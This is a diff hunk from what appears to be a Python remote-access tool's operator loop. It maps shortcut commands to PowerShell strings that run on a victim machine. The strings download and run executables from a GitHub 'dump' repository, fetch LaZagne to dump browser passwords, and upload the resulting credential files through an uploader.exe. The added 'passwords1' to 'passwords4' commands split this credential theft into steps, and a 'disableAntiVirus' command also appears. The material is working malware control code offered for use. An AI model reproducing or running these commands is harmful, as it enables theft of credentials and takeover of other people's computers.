@@ -43,6 +43,14 @@ while True:
 		command_to_send = 'thread powershell;start-bitstransfer -source "https://github.com/jonathanbreitg/dump/blob/main/server.zip?raw=true" -destination "server.zip" -TransferType Download;Expand-Archive -Path server.zip -DestinationPath server;cd server;cd server;./server.exe'
 	elif command_to_send == "passwords":
 		command_to_send = 'thread powershell;start-bitstransfer -source "https://github.com/jonathanbreitg/dump/blob/main/lazagne.exe?raw=true" -destination "lazagne.exe" -TransferType Download;cmd start cmd /c lazagne.exe browsers -oN -output asd;powershell start-bitstransfer -source "https://github.com/jonathanbreitg/dump/blob/main/uploader.exe?raw=true" -destination "uploader.exe";./uploader.exe credential*.txt'
+	elif command_to_send == "passwords1":
+		command_to_send = 'powershell;start-bitstransfer -source "https://github.com/jonathanbreitg/dump/blob/main/lazagne.exe?raw=true" -destination "lazagne.exe" -TransferType Download'
+	elif command_to_send == "passwords2":
+		command_to_send = 'cmd start cmd /c lazagne.exe browsers -oN -output asd;'
+	elif command_to_send == "passwords3":
+		command_to_send = 'powershell type cred*.txt;powershell start-bitstransfer -source "https://github.com/jonathanbreitg/dump/blob/main/uploader.exe?raw=true" -destination "uploader.exe"'
+	elif command_to_send == "passwords4":
+		command_to_send = 'powershell ./uploader.exe cred*.txt'
 	elif command_to_send == "kill_down":
 		command_to_send = 'powershell "Get-BitsTransfer | Remove-BitsTransfer"'
 	elif command_to_send == "disableAntiVirus":
